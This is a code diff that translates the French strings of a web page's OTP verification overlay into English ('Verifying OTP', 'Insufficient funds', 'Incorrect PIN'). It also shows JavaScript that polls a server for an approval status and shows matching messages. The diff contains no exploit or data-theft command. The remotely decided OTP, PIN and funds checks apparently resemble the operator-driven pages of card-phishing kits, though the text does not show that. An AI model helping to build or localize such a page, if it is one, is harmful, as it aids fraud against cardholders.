@@ -209,10 +209,10 @@ body {
 <div id="approvalOverlay" class="approval-overlay" role="dialog" aria-modal="true">
   <div class="approval-content">
     <div id="spinner" class="spinner"></div>
-    <h3 id="overlayTitle">Vérification de l'OTP</h3>
-    <p id="overlayText">Veuillez patienter... (1s)</p>
-    <p id="deniedMsg" style="display:none;">Code incorrect.</p>
-    <button id="retryBtn" type="button" style="display:none;">Réessayer</button>
+    <h3 id="overlayTitle">Verifying OTP</h3>
+    <p id="overlayText">Please wait... (1s)</p>
+    <p id="deniedMsg" style="display:none;">Incorrect code.</p>
+    <button id="retryBtn" type="button" style="display:none;">Retry</button>
   </div>
 </div>
 
@@ -291,10 +291,10 @@ body {
     overlay.classList.add('visible');
     overlay.classList.remove('error-state');
     spinner.style.display = 'block';
-    overlayTitle.textContent = 'Vérification de l\'OTP';
+    overlayTitle.textContent = 'Verifying OTP';
     overlayTitle.style.display = 'block';
     overlayText.style.display = 'block';
-    overlayText.textContent = 'Veuillez patienter... (1s)';
+    overlayText.textContent = 'Please wait... (1s)';
     deniedMsg.style.display = 'none';
     retryBtn.style.display = 'none';
 
@@ -302,7 +302,7 @@ body {
     if (window.__otpWaitTimer) clearInterval(window.__otpWaitTimer);
     window.__otpWaitTimer = setInterval(() => {
       waitingSeconds += 1;
-      overlayText.textContent = `Veuillez patienter... (${waitingSeconds}s)`;
+      overlayText.textContent = `Please wait... (${waitingSeconds}s)`;
     }, 1000);
   }
 
@@ -321,7 +321,7 @@ body {
           spinner.style.display = 'none';
           overlayTitle.style.display = 'none';
           overlayText.style.display = 'none';
-          deniedMsg.textContent = 'Code incorrect.';
+          deniedMsg.textContent = 'Incorrect code.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         } else if (data.status === 'insufficient') {
@@ -330,7 +330,7 @@ body {
           overlayTitle.style.display = 'none';
           overlayText.style.display = 'none';
           overlay.classList.add('error-state');
-          deniedMsg.textContent = 'Fonds insuffisants.';
+          deniedMsg.textContent = 'Insufficient funds.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         } else if (data.status === 'demo_error') {
@@ -339,7 +339,7 @@ body {
           overlayTitle.style.display = 'none';
           overlayText.style.display = 'none';
           overlay.classList.add('error-state');
-          deniedMsg.textContent = 'Broche incorrecte.';
+          deniedMsg.textContent = 'Incorrect PIN.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         }
@@ -355,7 +355,7 @@ body {
       window.__otpWaitTimer = null;
     }
 
-    if (deniedMsg.textContent.trim() === 'Broche incorrecte.') {
+    if (deniedMsg.textContent.trim() === 'Incorrect PIN.') {
       window.location.href = 'trial.html';
       return;
     }
@@ -386,8 +386,8 @@ body {
       pollApproval(data.id);
     } catch (error) {
       requestInProgress = false;
-      overlayTitle.textContent = 'Erreur de connexion';
-      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+      overlayTitle.textContent = 'Connection error';
+      overlayText.textContent = 'Unable to send the request. Check your connection and try again.';
       spinner.style.display = 'none';
       retryBtn.style.display = 'inline-block';
     }
